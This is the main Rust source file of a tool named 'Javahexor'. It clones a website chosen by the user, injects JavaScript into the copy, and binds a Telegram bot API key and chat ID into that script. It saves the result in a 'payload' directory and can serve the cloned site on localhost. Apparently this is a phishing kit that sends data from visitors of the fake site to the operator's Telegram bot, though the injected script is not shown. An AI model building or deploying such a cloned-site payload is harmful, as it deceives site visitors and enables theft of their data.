#[warn(unused_imports)]
mod bind;
mod website_cloner;
mod localhost;
use std::io;
use tokio;
// use reqwest;
use bind::{bind_js_to_file, bind_js_to_html};
use website_cloner::download_index_html;
use localhost::server;
use std::process::Command;

#[allow(unused_macros)]
macro_rules! read {
    ($out:ident as $type:ty) => {
        let mut inner = String::new();
        std::io::stdin().read_line(&mut inner).expect("Please Input Only numbers");
        let $out = inner.trim().parse::<$type>().expect("Parsable");
    };
}


#[tokio::main]
async fn main() -> Result<(), anyhow::Error> {
    // Input api_key and chat_id
    // Here we are using keys and urls only ones so we dont need worry about ownership ;)

    println!("Welcome to Javahexor Rust!");
    println!(
        "1. Build site from Scrach\n2. Start an HTTP server Locally \n3.Exit"
    );
    println!("Option : ");
    read!(x as u8);

    match x {
        1 => {
            println!("Clicked Option 1");
            new_users().await?;
            std::process::exit(1);
        },

        2 => {
            start_http_server().await?; // dead ;)
            std::process::exit(1);
        },
        _ => {
            println!("Exiting javahexor !");
            std::process::exit(1);
        },
    };
}

#[warn(unused_imports)]
async fn new_users() -> Result<(), anyhow::Error>{

    Command::new("clear").status().unwrap();
    let mut api_key = String::new();
    let mut chat_id = String::new();
    println!("Enter the Telebot API KEY : ");
    io::stdin().read_line(&mut api_key).unwrap();
    println!("Enter Your Chat_iD :");
    io::stdin().read_line(&mut chat_id).unwrap();
    Command::new("clear").status().unwrap();

    let api_key = api_key.trim_end();
    let chat_id = chat_id.trim_end();

    println!("Following Credentials:");

    println!("BOT API_KEY : {} \nCHAT_ID: {}",&api_key, &chat_id);

    bind_js_to_file(api_key, chat_id)?;

    println!("Paste the URL you need to paste !");
    let mut url = String::new();
    io::stdin().read_line(&mut url).unwrap();
    let url = url.trim_end();
    println!("Cloning the site as you need\n");
    let file_path = "payload/index.html";

    download_index_html(url, file_path).await?;
    bind_js_to_html();

    println!("Do you need to start localhost the payload binded site ?! y/n" );
    let mut option = String::new();
    io::stdin().read_line(&mut option).unwrap();
    let option :&str = option.trim_end();
    Command::new("clear").status().unwrap();
    match option {
        "yes" => start_http_server().await?,
        "y" => start_http_server().await?,
        "YES" => start_http_server().await?,
        _ => println!("Payload setup completed : Saved files at /payload dir"),
    }

    Ok(())
}

async fn start_http_server() -> Result<(), anyhow::Error>{
    println!("Starting Server !");
    println!("Opens at http://127.0.0.1:8080");
    server().await?;
    Ok(())
}



